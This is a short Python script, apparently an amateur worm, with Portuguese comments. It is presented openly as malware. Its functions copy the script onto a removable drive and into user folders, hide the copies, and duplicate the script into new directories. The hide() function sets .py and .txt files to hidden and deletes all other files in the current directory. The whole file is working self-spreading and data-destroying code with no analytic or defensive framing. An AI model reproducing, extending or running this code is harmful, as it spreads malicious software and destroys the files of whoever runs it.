#========WORM OPERATOR==========
from shutil import copyfile
import os, getpass
from sys import argv
import win32con, win32api
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import os, random, sys, pkg_resources
from urllib2 import urlopen
import subprocess as sp
import shutil
import subprocess

# Função para rodar um comando no terminal
def run_command(command):
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    return process.returncode, stdout, stderr

# Função para propagar o worm
def propagate():
    # Copiando o worm para o diretório de inicialização do sistema operacional
    source = os.path.abspath("worm.py")
    # Verificando o sistema operacional
    user = getpass.getuser()

    # Verificando a unidade de disco
    if (os.path.isdir("E:\\")):
        destination = "E:"+ "\\worm.py"
    
    # Verificando pasta de documentos do Linux
    elif (os.path.isdir("/home/" + user + "/Documents")):
        destination = "/home/" + user + "/Documents/"+"worm.py"

    # Verificando pasta de downloads do Linux
    elif (os.path.isdir("/home/" + user + "/Downloads")):
        destination = "/home/" + user + "/Downloads/"+"worm.py"

    # Verificando pasta de documentos do Windows
    elif(os.path.isdir("C:\\")):
        destination = "C:\\Users\\"+user+"\\worm.py"

    else:
        # Se não for possível encontrar um local para copiar o worm, será salvo na pasta atual
        destination = os.getcwd() + "\\worm.py"

    copyfile(source, destination)
    run_command("attrib +h " + destination)
    print("O worm será propagado para:")
    print("Origem: " + source)
    print("Destino: " + destination)

def copy():
    # Copiando o worm para o diretório de inicialização do sistema operacional
    script = argv
    name = str(script[0])
    brutal = os.path.abspath(name)

    for i in range(0, 4):
        try:
            # Criando um diretório para copiar o worm
            directoryName = "copy"+str(i)
            os.mkdir(directoryName)
            shutil.copy2(brutal, directoryName)
            source = os.path.abspath(directoryName)
        except:
            pass

def hide():
    for file_name in os.listdir('.'):
        if file_name.find('.py') == len(file_name) - len('.py'):
            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_HIDDEN)
        elif file_name.find('.txt') == len(file_name) - len('.txt'):
            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_HIDDEN)
        else:
            win32api.SetFileAttributes(file_name, win32con.FILE_ATTRIBUTE_NORMAL)
            os.remove(file_name)